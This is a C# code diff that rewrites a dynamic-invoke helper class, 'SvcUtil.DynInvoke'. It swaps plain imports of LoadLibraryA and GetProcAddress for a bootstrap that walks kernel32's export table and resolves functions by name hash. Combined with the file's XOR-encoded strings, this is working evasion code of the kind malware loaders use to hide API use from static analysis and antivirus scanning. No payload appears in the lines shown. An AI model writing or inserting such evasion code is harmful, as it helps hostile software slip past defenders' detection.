@@ -1,4 +1,5 @@
 using System;
+using System.Diagnostics;
 using System.Runtime.InteropServices;
 using System.Text;
 
@@ -6,11 +7,98 @@ namespace SvcUtil
 {
     internal static class DynInvoke
     {
-        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
-        private static extern IntPtr LoadLibraryA(string lpFileName);
+        // ── Bootstrap delegate types ────────────────────────────────
 
-        [DllImport("kernel32.dll", SetLastError = true, CharSet = CharSet.Ansi)]
-        private static extern IntPtr GetProcAddress(IntPtr hModule, string lpProcName);
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Ansi)]
+        private delegate IntPtr DLoadLibraryA(string lpFileName);
+
+        [UnmanagedFunctionPointer(CallingConvention.StdCall, SetLastError = true, CharSet = CharSet.Ansi)]
+        private delegate IntPtr DGetProcAddress(IntPtr hModule, string lpProcName);
+
+        private static DLoadLibraryA _loadLibraryA;
+        private static DGetProcAddress _getProcAddress;
+
+        // djb2 hash constants for bootstrap APIs
+        private const uint H_GPA = 0xAADFAB0B; // GetProcAddress
+        private const uint H_LLA = 0x01ED9ADD; // LoadLibraryA
+
+        // ── EAT Walking Bootstrap ───────────────────────────────────
+
+        private static IntPtr FindKernel32Base()
+        {
+            var modules = Process.GetCurrentProcess().Modules;
+            string target = D(_k32);
+            for (int i = 0; i < modules.Count; i++)
+            {
+                if (string.Equals(modules[i].ModuleName, target,
+                        StringComparison.OrdinalIgnoreCase))
+                    return modules[i].BaseAddress;
+            }
+            return IntPtr.Zero;
+        }
+
+        private static uint Djb2(IntPtr strPtr)
+        {
+            uint h = 5381;
+            int off = 0;
+            byte b;
+            while ((b = Marshal.ReadByte(strPtr, off++)) != 0)
+                h = ((h << 5) + h) ^ b;
+            return h;
+        }
+
+        private static IntPtr ResolveExport(IntPtr modBase, uint targetHash)
+        {
+            int e_lfanew = Marshal.ReadInt32(modBase, 0x3C);
+            IntPtr peHdr = (IntPtr)(modBase.ToInt64() + e_lfanew);
+
+            // PE32 (0x10B) vs PE32+ (0x20B) — export dir offset differs
+            short magic = Marshal.ReadInt16(peHdr, 0x18);
+            int exportRva = Marshal.ReadInt32(peHdr, magic == 0x20B ? 0x88 : 0x78);
+            if (exportRva == 0) return IntPtr.Zero;
+
+            IntPtr exportDir = (IntPtr)(modBase.ToInt64() + exportRva);
+            int numNames   = Marshal.ReadInt32(exportDir, 0x18);
+            int rvaFuncs   = Marshal.ReadInt32(exportDir, 0x1C);
+            int rvaNames   = Marshal.ReadInt32(exportDir, 0x20);
+            int rvaOrds    = Marshal.ReadInt32(exportDir, 0x24);
+
+            for (int i = 0; i < numNames; i++)
+            {
+                int nameRva = Marshal.ReadInt32(
+                    (IntPtr)(modBase.ToInt64() + rvaNames), i * 4);
+                IntPtr namePtr = (IntPtr)(modBase.ToInt64() + nameRva);
+
+                if (Djb2(namePtr) == targetHash)
+                {
+                    short ord = Marshal.ReadInt16(
+                        (IntPtr)(modBase.ToInt64() + rvaOrds), i * 2);
+                    int funcRva = Marshal.ReadInt32(
+                        (IntPtr)(modBase.ToInt64() + rvaFuncs), ord * 4);
+                    return (IntPtr)(modBase.ToInt64() + funcRva);
+                }
+            }
+            return IntPtr.Zero;
+        }
+
+        private static void EnsureBootstrap()
+        {
+            if (_loadLibraryA != null) return;
+
+            IntPtr k32 = FindKernel32Base();
+            if (k32 == IntPtr.Zero)
+                throw new EntryPointNotFoundException();
+
+            IntPtr pGpa = ResolveExport(k32, H_GPA);
+            IntPtr pLla = ResolveExport(k32, H_LLA);
+            if (pGpa == IntPtr.Zero || pLla == IntPtr.Zero)
+                throw new EntryPointNotFoundException();
+
+            _getProcAddress = (DGetProcAddress)Marshal.GetDelegateForFunctionPointer(
+                pGpa, typeof(DGetProcAddress));
+            _loadLibraryA = (DLoadLibraryA)Marshal.GetDelegateForFunctionPointer(
+                pLla, typeof(DLoadLibraryA));
+        }
 
         // ── String decode ───────────────────────────────────────────
         private static readonly byte[] _xk = { 0x71, 0x58, 0x2D, 0x93, 0xA4 };
@@ -53,14 +141,18 @@ namespace SvcUtil
             get
             {
                 if (_hKernel32 == IntPtr.Zero)
-                    _hKernel32 = LoadLibraryA(D(_k32));
+                {
+                    EnsureBootstrap();
+                    _hKernel32 = _loadLibraryA(D(_k32));
+                }
                 return _hKernel32;
             }
         }
 
         private static Delegate GetFunc(byte[] enc, Type delegateType)
         {
-            IntPtr addr = GetProcAddress(Kernel32, D(enc));
+            EnsureBootstrap();
+            IntPtr addr = _getProcAddress(Kernel32, D(enc));
             if (addr == IntPtr.Zero)
                 throw new EntryPointNotFoundException();
             return Marshal.GetDelegateForFunctionPointer(addr, delegateType);
@@ -185,11 +277,16 @@ namespace SvcUtil
 
         // ── Public wrappers for external module resolution ───────────
 
-        public static IntPtr LoadLib(string dllName) { return LoadLibraryA(dllName); }
+        public static IntPtr LoadLib(string dllName)
+        {
+            EnsureBootstrap();
+            return _loadLibraryA(dllName);
+        }
 
         public static IntPtr GetProc(IntPtr hModule, string procName)
         {
-            return GetProcAddress(hModule, procName);
+            EnsureBootstrap();
+            return _getProcAddress(hModule, procName);
         }
 
         // ── Public accessors (runtime resolved) ─────────────────────
